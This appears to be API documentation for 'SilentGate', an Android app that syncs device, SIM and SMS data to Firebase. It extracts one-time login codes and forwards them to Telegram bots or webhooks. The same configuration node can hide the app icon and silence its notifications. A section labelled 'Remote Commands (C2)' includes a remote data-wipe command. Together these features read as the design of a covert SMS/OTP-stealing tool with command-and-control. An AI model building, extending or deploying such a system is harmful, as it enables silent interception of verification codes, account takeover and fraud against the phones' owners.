# SilentGate Firebase Schema & API Documentation
**Version**: 2026.08.06
**Service**: Firebase Realtime Database (RTDB)

This document provides a comprehensive overview of the Firebase structure, node paths, and JSON payloads used by the SilentGate ecosystem for device tracking, message forwarding, and remote orchestration.

---

## 1. Device Registration & Inventory
**Path**: `/gateways/{deviceId}`
**Action**: `UPDATE` (Merging)
**Trigger**: App startup, onboarding completion, or heartbeat loop.

### Payload Schema
```json
{
  "info": {
    "modelName": "Pixel 7 Pro",
    "manufacturer": "Google",
    "androidVersion": "15 (API 35)",
    "appVersion": "1.0.0",
    "createdAt": { ".sv": "timestamp" },
    "isAdmin": true
  },
  "sims": [
    {
      "subId": "1",
      "carrier": "Jio",
      "number": "+91XXXXXXXXXX",
      "slot": 0
    }
  ],
  "status": {
    "online": true,
    "lastSeen": { ".sv": "timestamp" },
    "battery": 85,
    "isCharging": false,
    "networkType": "WiFi",
    "lastHeartbeat": { ".sv": "timestamp" }
  },
  "smsStats": {
    "successCount": 150,
    "failCount": 2,
    "dailySent": 12,
    "lastSuccess": { ".sv": "timestamp" }
  }
}
```

---

## 2. Message Synchronization
**Path**: `/messages/{deviceId}/{timestamp}`
**Action**: `SET` (Overwrite)
**Trigger**: Incoming SMS or Mirrored Notification.

### Payload Schema
```json
{
  "id": 1234,
  "deviceId": "606cdbd049fdcad2",
  "sender": "+918084799136",
  "senderType": "personal",
  "message": "Your login code is 5544",
  "messagePreview": "Your login code is 5544",
  "timestamp": 1786035029789,
  "dateTime": "06-08-2026 | 10:20 PM",
  "isoTime": "2026-08-06T22:20:29+05:30",
  "type": "incoming",
  "direction": "in",
  "simSlot": 1,
  "operator": "Airtel",
  "isOtp": true,
  "otpCode": "5544",
  "language": "en",
  "length": 24,
  "containsLink": false,
  "links": [],
  "containsPhone": false,
  "phones": [],
  "isRead": false
}
```

---

## 3. Real-time Heartbeat (Lightweight)
**Path**: `/heartbeat/{deviceId}`
**Action**: `UPDATE`
**Trigger**: Every 5 minutes (Gaussian jitter applied).

### Payload Schema
```json
{
  "online": true,
  "lastSeen": { ".sv": "timestamp" },
  "battery": 42
}
```

---

## 4. Network Orchestration (Global Settings)
**Path**: `/settings/global`
**Action**: `UPDATE` (Admin Only) / `LISTEN` (All Nodes)
**Trigger**: Admin clicks "Broadcast to All Nodes".

### Payload Schema
```json
{
  "forwardToTelegram": "true",
  "telegramBotToken": "123456789:ABC...",
  "telegramChatId": "-100XXXXXXXXX",
  "telegramBypassRules": "false",
  "forwardToWebhook": "true",
  "defaultWebhookUrl": "https://server.com/api",
  "webhookBypassRules": "true",
  "otpOnlyMode": true,
  "maxDailySmsPerDevice": 100,
  "darkMode": true,
  "amoledMode": false,
  "hideIcon": false,
  "notificationHidden": true,
  "notificationSilent": true,
  "updatedAt": { ".sv": "timestamp" },
  "updatedBy": "admin_device_id"
}
```

---

## 5. System Logs (Error Tracking)
**Path**: `/logs/{deviceId}/{timestamp}`
**Action**: `SET`
**Trigger**: Forwarding failure or critical exception.

### Payload Schema
```json
{
  "type": "error",
  "timestamp": { ".sv": "timestamp" },
  "message": "Failed to connect to SMTP server",
  "source": "EmailForwarder",
  "extra": {
    "syncType": "realtime"
  }
}
```

---

## 6. Remote Commands (C2)
**Path**: `/commands/{deviceId}/{commandId}`
**Action**: `SET` (Admin) / `LISTEN` & `DELETE` (Client)

### Payload Schema
```json
{
  "command": "WIPE_DATA",
  "payload": "emergency_confirm",
  "timestamp": { ".sv": "timestamp" }
}
```

---

## Technical Notes & Response Behavior

1.  **Response Handling**: Since the app uses the Firebase Android SDK, responses are handled asynchronously via `addOnCompleteListener` or Kotlin Coroutines `await()`.
2.  **Concurrency**: The app uses `updateChildren()` for registration and heartbeats to ensure existing data (like SMS stats) is preserved during the merge.
3.  **Conflict Resolution**: Message synchronization uses `setValue()` at a unique timestamp path (`/messages/{id}/{ts}`) to prevent collisions while allowing multiple messages per second.
4.  **Security**: All paths are subject to Firebase Realtime Database Security Rules. By default, the app expects `.read` and `.write` permissions to be handled via either anonymous auth or a secret if using the REST compatibility layer.
